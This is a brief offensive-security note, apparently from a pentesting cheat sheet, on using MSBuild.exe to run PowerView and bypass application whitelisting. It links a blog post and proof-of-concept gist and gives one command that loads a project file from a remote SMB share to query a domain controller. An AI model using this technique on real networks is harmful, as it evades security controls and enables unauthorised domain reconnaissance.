### Using msbuild.exe to execute PowerView for application whitlisting
* [More Infos](http://subt0x10.blogspot.de/2017/04/bypassing-application-whitelisting.html) - Blogpost from SubTee
* [GIST POC](https://gist.github.com/subTee/385c1f6831b14675056a21e6907b07b7)

Example:
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe \\1.2.3.4\share\powerviewdev.xml /p:FunctionName="Get-DomainPolicy -Server dc01.hackme.int"
```
